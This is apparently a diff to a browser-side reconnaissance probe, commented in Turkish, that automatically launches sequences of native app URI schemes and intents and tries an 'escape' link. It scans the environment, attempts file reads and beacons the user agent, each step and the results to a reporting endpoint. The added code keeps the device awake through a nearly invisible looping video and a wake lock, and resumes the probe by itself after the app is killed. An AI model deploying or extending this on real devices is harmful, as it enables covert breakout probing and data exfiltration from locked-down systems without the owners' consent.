@@ -120,6 +120,33 @@ function reportBeacon(msg){
   try{ var b = new Blob(['[probe] ' + msg], {type:'text/plain'}); navigator.sendBeacon(NT, b); }catch(e){ report(msg); }
 }
 
+/* Ekranı uyanık tut: wake lock + NoSleep video */
+var _wl = null;
+function keepAwake(){
+  try{ if (navigator.wakeLock && !_wl){ navigator.wakeLock.request('screen').then(function(s){ _wl = s; s.addEventListener('release', function(){ _wl = null; }); }).catch(function(){}); } }catch(e){}
+  try{
+    if (!window._nsVideo){
+      var c = document.createElement('canvas'); c.width = 2; c.height = 2;
+      var ctx = c.getContext('2d');
+      var v = document.createElement('video'); v.muted = true; v.setAttribute('playsinline',''); v.loop = true;
+      v.style.cssText = 'position:fixed;right:0;bottom:0;width:2px;height:2px;opacity:0.01;pointer-events:none';
+      try{ v.srcObject = c.captureStream ? c.captureStream(2) : null; }catch(e){ v.srcObject = null; }
+      document.body.appendChild(v); var p = v.play(); if (p && p.catch) p.catch(function(){});
+      setInterval(function(){ try{ ctx.fillStyle = (ctx.fillStyle === '#000') ? '#111' : '#000'; ctx.fillRect(0,0,2,2); }catch(e){} }, 4000);
+      window._nsVideo = v;
+    }
+  }catch(e){}
+}
+
+/* Blackout/öldürme sonrası aynı testi baştan yapmamak için imleç + çalışıyor bayrağı */
+var PROBE_CUR = 'toggx_probe_cursor';
+var PROBE_RUN = 'toggx_probe_run';
+var probeActive = false;
+function probeCursor(){ try{ return parseInt(localStorage.getItem(PROBE_CUR) || '0', 10) || 0; }catch(e){ return 0; } }
+function setProbeCursor(n){ try{ localStorage.setItem(PROBE_CUR, String(n)); }catch(e){} }
+function probeRunning(){ try{ return localStorage.getItem(PROBE_RUN) === '1'; }catch(e){ return false; } }
+function setProbeRunning(b){ try{ if (b) localStorage.setItem(PROBE_RUN, '1'); else localStorage.removeItem(PROBE_RUN); }catch(e){} }
+
 function uriOf(it){
   if (it.uri) return it.uri;
   if (it.intent) return ToggKit.buildIntent(it.intent);
@@ -151,7 +178,14 @@ function armDetect(key, ms){
   setTimeout(function(){ if (pending === key){ setStatus(key, 'bad', 'yanıt yok'); pending = null; } }, ms || 1200);
 }
 document.addEventListener('visibilitychange', function(){
-  if (document.hidden && pending){ setStatus(pending, 'ok', 'native açıldı'); log('NATIVE AÇILDI: ' + pending); reportBeacon('NATIVE ' + pending); pending = null; }
+  if (document.hidden && pending){
+    setStatus(pending, 'ok', 'native açıldı'); log('NATIVE AÇILDI: ' + pending); reportBeacon('NATIVE ' + pending);
+    if (probeRunning()) reportBeacon('LEFT ' + pending + ' (app arka plana düştü)');
+    pending = null;
+  } else if (!document.hidden && !probeActive && probeRunning()){
+    keepAwake();
+    setTimeout(autoRecon, 800);
+  }
 });
 window.addEventListener('blur', function(){ if (pending){ setStatus(pending, 'ok', 'blur'); log('BLUR: ' + pending); reportBeacon('BLUR ' + pending); pending = null; } });
 
@@ -331,24 +365,35 @@ function fileRead(){
   });
 }
 
-function autoRecon(){
-  var seq = CRIT.map(function(c){ return {uri:uriOf(c), key:c.id+':link'}; })
+function reconSeq(){
+  return CRIT.map(function(c){ return {uri:uriOf(c), key:c.id+':link'}; })
     .concat(SCHEMES.filter(function(s){ return s.g.indexOf('Kritik') >= 0; })
       .map(function(s){ return {uri:uriOf(s), key:s.id+':link'}; }))
     .concat([{uri:'https://example.com', key:'escape:link'}]);
-  reportBeacon('RECON_START ua=' + navigator.userAgent);
+}
+function autoRecon(){
+  if (probeActive) return;
+  probeActive = true;
+  var seq = reconSeq();
+  var start = probeCursor();
+  if (start >= seq.length) start = 0;
+  setProbeRunning(true);
+  keepAwake();
+  reportBeacon('RECON_START from=' + start + '/' + seq.length + ' ua=' + navigator.userAgent);
   scanEnv();
   try{ fileRead(); }catch(e){}
-  var i = 0;
+  var i = start;
   (function next(){
     if (i >= seq.length){
+      probeActive = false; setProbeRunning(false); setProbeCursor(0);
       reportBeacon('RECON_DONE ' + JSON.stringify(results));
-      setTimeout(sendAll, 1500);
+      setTimeout(sendAll, 1200);
       return;
     }
-    var it = seq[i++];
-    invoke(it.uri, 'link', it.key);
-    setTimeout(next, 2000);
+    var it = seq[i]; setProbeCursor(i + 1); i++;
+    reportBeacon('STEP ' + it.key);
+    invoke(it.uri, 'iframe', it.key);
+    setTimeout(next, 2200);
   })();
 }
 
@@ -401,7 +446,11 @@ window.addEventListener('load', function(){
     return;
   }
   scanEnv();
-  if (/(^|[#&])auto/.test(location.hash || '')){ reportBeacon('AUTO_START (hash)'); setTimeout(autoRecon, 600); }
+  keepAwake();
+  if (/(^|[#&])auto/.test(location.hash || '') || probeRunning()){
+    reportBeacon('AUTO_START/RESUME (hash=' + (location.hash || '-') + ' run=' + probeRunning() + ')');
+    setTimeout(autoRecon, 600);
+  }
 });
 </script>
 </body>
